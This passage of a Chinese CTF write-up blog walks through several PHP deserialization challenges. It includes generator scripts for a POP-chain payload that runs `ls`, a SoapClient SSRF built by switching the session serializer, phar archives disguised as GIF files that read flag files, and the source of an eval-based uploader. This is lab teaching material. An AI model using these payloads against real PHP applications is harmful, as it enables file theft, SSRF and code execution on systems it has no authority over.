class="comment">#重复用到了fin-&gt;f1和min-&gt;m1，所以有$mix2 = new mix();$fin2 = new fin();</span></span><br><span class="line"><span class="variable">$fin</span>-&gt;f1 = <span class="variable">$what</span>;</span><br><span class="line"><span class="variable">$what</span>-&gt;a = <span class="variable">$mix</span>;</span><br><span class="line"><span class="variable">$mix</span>-&gt;m1 = <span class="variable">$crow</span>;</span><br><span class="line"><span class="variable">$crow</span>-&gt;v1 = <span class="variable">$fin2</span>;</span><br><span class="line"><span class="variable">$fin2</span>-&gt;f1 = <span class="variable">$mix2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span>-&gt;m1 = <span class="string">&quot;?&gt;&lt;?php echo `ls`;?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$fin</span>);</span><br></pre></td></tr></table></figure><h4 id="buu–bestphp‘s-revenge"><a href="#buu–bestphp‘s-revenge" class="headerlink" title="buu–bestphp‘s revenge"></a>buu–bestphp‘s revenge</h4><p>flag.php（目录扫描得到）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">only localhost can get flag!</span><br><span class="line"><span class="title function_ invoke__">session_start</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>; </span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">&#123; <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>; &#125; </span><br><span class="line">only localhost can get flag! </span><br></pre></td></tr></table></figure><blockquote><p>本地请求访问flag.php时，会将flag写入session中</p><p>利用php原生类SoapClient可以构造ssrf，需要触发SoapClient::call。</p></blockquote><p>SoapClient：</p><p><a href="https://www.anquanke.com/post/id/153065#h2-1">https://www.anquanke.com/post/id/153065#h2-1</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>上面提到了要触发SoapClient::call。那么哪里可以实例化SoapClient对象呢？</p><blockquote><p>答案是在session中实例化。<a href="https://xz.aliyun.com/t/6640#toc-5">https://xz.aliyun.com/t/6640#toc-5</a></p></blockquote><p><img src="/../images/20191026142328-1fba974c-f7b9-1-1687419234886.png" alt="img"></p><p>$_SESSION环境变量和服务器上的seission文件</p><blockquote><p>$_SESSION环境变量：保存实例化对象</p><p>在会话结束后将数据序列化保存到seission文件中。</p><p>会话开始后，会根据cookie中的phpsession_id将session文件（如果有）的内容反序列化保存到$_SESSION环境变量中。</p></blockquote><p>序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br></pre></td></tr></table></figure><p>第一次，更改php的session引擎，通过序列化和反序列化时引擎的不同使下一次请求时session中保存的是我们构造的SoapClient对象。</p><p><img src="/../images/image-20220730203810430-1687419234886.png" alt="image-20220730203810430"></p><blockquote><p>POST ：serialize_handler&#x3D;php_serialize</p><p>GET    :   f&#x3D;session_start</p><p><code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>将session引擎设置为php_serialize（在下一次中生效）</p></blockquote><p>注：使用session_start设置引擎，而不是用ini_set来设置，因为session_start能够处理数组，而ini_set不行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>(<span class="title function_ invoke__">arrary</span>(<span class="string">&#x27;serialize_handler&#x27;</span>=&gt;<span class="string">&#x27;php_serialize&#x27;</span>))</span><br></pre></td></tr></table></figure><blockquote><p>GET:   name&#x3D; |+序列化内容（记得在前面加上|）</p><p>$_SESSION[‘name’] &#x3D; $_GET[‘name’];</p><p>这时候session文件中保存的数据就是上图response中的。</p></blockquote><p>第二次，还是上一次的cookie，通过覆盖变量触发SoapClient::call方法</p><p><img src="/../images/image-20220730204831558-1687419234886.png" alt="image-20220730204831558"></p><blockquote><p>与上一次相同的cookie，服务器就会根据cookie找到我们构造的session文件，并将其内容反序列化保存到$_SESSION中，此时因为引擎的不同，反序列化后得到的就是构造好的SoapClient对象。</p></blockquote><p>触发SoapClient::call方法</p><blockquote><p>POST ：b&#x3D;call_user_func</p><p>GET    :   f&#x3D;extract</p><p><code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>即<code>extract($_POST)</code>→b&#x3D;call_user_func</p><p><code>$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);</code></p><p><code>call_user_func($b, $a);</code>即</p><p><code>call_user_func(call_user_func, arrary(reset($_SESSION),&#39;welcome_to_the_lctf2018&#39;))</code></p><p>即<code>call_user_func（arrary(reset($_SESSION),&#39;welcome_to_the_lctf2018&#39;)）</code></p><p>即调用了reset($_SESSION)中的’welcome_to_the_lctf2018’方法</p><p>而reset($_SESSION)即是SoapClient对象，没有’welcome_to_the_lctf2018’方法，就触发了SoapClient::call方法,从而将flag保存到我们构造的cookie所对应的session中。</p></blockquote><p>第三次，将cookie设置为我们构造的cookie，获得对应的session</p><p><img src="/../images/image-20220730212228972-1687419234886.png" alt="image-20220730212228972"></p><h3 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3><p>打开是登录页面，要么目标就是登录上去，要么就是登录后的功能有问题。</p><p>先找注册界面，有注册界面，那应该就是登陆后的功能有问题。</p><p>有一个文件上传，下载，删除功能。经测试，文件下载部分存在任意文件下载漏洞，通过此漏洞得到源码。</p><hr><p>代码审计：</p><p>因为buu上有phar标签，所以知道考的是phar。</p><p>反着找，先找文件函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span>.php下</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line"></span><br><span class="line"><span class="title class_">File</span>::<span class="variable constant_">close</span>调用了<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename)触发phar反序列化</span><br><span class="line">所以要构造filename=flag所在路径</span><br></pre></td></tr></table></figure><p>再看哪里调用了close方法：</p><ol><li><p>download.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">21</span>,<span class="number">17</span>:     <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">但是这里限制了目录访问并过滤了flag，所以不能利用</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>)</span><br></pre></td></tr></table></figure></li><li><p>class.php</p></li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">User</span>::<span class="variable constant_">destruct</span></span><br><span class="line"><span class="number">57</span>,<span class="number">20</span>:         <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">所以猜测要让<span class="variable">$db</span>为File对象</span><br></pre></td></tr></table></figure><p>正着找</p><ol><li><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Name</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Size</span>();</span><br><span class="line">首先实例化了FileList类，然后调用了这个类中的Name和Size方法，但是FileList类中没有这两个方法，那么就会调用</span><br><span class="line">__call魔术方法</span><br></pre></td></tr></table></figure></li><li><p>查找FileList类是否有call方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Filelist</span>::<span class="variable constant_">call</span>：</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">__call方法的参数<span class="variable">$func</span>是被调用的不存在的方法名</span><br><span class="line">关注<span class="variable">$file</span>-&gt;<span class="variable">$func</span>()，调用了<span class="variable">$func</span>()</span><br></pre></td></tr></table></figure></li><li><p>$file是什么：往前看</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">    <span class="comment">//知道$file是File对象</span></span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">    <span class="comment">//知道files存放path下的所有文件对象($filenames = scandir($path);)</span></span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line"> &#125;   </span><br></pre></td></tr></table></figure></li><li><p>回看call方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="comment">//results[文件名][方法名]=File::$func的结果</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以Filelist::call就是当Filelist对象调用的方法不在Filelist类时，将该方法用File类重载，并把执行结果保存到Filelist.results中。<br>所以如果Filelist对象调用了close方法，就相当于调用了File.close()。<br>所以$db应该为Filelist对象，这样就可以调用File.close()</p></li><li><p>继续向下看</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)中关注</span></span><br><span class="line"><span class="function"><span class="title">foreach</span> (<span class="params"><span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">将方法结果保存到value即table中</span><br><span class="line">最后<span class="keyword">echo</span> <span class="variable">$table</span>;就相当于<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure></li><li><p>到这里思路就清晰了。</p></li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">我们让User类中的<span class="variable">$db</span>为Filelist对象，当<span class="variable">$db</span>销毁时触发<span class="title class_">User</span>::<span class="title function_ invoke__">destruct</span>()方法，就会调用close方法，但是<span class="title class_">Filelist</span>::<span class="variable constant_">close</span>不存在，就会触发<span class="title class_">Filelist</span>::<span class="variable constant_">call</span>,从而调用<span class="title class_">File</span>::<span class="variable constant_">close</span>,执行<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>)，最后将结果返回输出。</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">            </span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;<span class="comment"># 这里的flag.txt是多次猜测出来的</span></span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#让User类中的$db为Filelist对象</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$filelist</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;db = <span class="variable">$filelist</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);  <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$user</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后将生成的phar.phar上传(直接修改文件后缀名后上传或者抓包修改content-type)为phar.gif，然后使用phar协议访问文件，有两个地方可以访问，download.php和delete.php，前面分析过dowmload.php对目录和文件名作了限制，所以使用delete.php来进行访问。</p><p><img src="/../images/image-20220708203217989-1687419234886.png" alt="image-20220708203217989"></p><h3 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h3><p>I&#x2F;O操作</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Test</span>::<span class="variable constant_">file_get</span></span><br><span class="line"><span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>))</span><br></pre></td></tr></table></figure><p>$value：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br></pre></td></tr></table></figure><p>$key：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__get魔术方法</span><br><span class="line">找读取不存在/保护的属性</span><br><span class="line"></span><br><span class="line">show::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">让str[<span class="string">&#x27;str&#x27;</span>]为Test类，然后Test类下没有source属性就会触发<span class="title class_">Test</span>::<span class="variable constant_">__get</span></span><br><span class="line">所以<span class="variable">$key</span>=source</span><br><span class="line">    </span><br><span class="line">__toString方法</span><br><span class="line">C1e4r下的__destruct <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">令test为show</span><br></pre></td></tr></table></figure><p>POP链</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C1e4r::__destruct → Show::__toString → Test::__get → Test::get  → Test::file_get </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="comment">//注意构造的顺序，从pop链尾到头</span></span><br><span class="line"><span class="variable">$c</span>-&gt;params=<span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//生成的压缩文件名为test.phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h4><p><a href="https://blog.csdn.net/qq_54929891/article/details/124785091">https://blog.csdn.net/qq_54929891/article/details/124785091</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Uploader类</span></span><br><span class="line"><span class="comment"># 如果name有赋值，并通过过滤，filename==name，如果没有，则filename=$sandbox.$_SESSION[&#x27;user&#x27;].$ext</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"><span class="comment"># 返回name或者$sandbox.$_SESSION[&#x27;user&#x27;].$ext</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (â²â½`ã)&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 每一次上传文件结束后触发</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line"><span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span 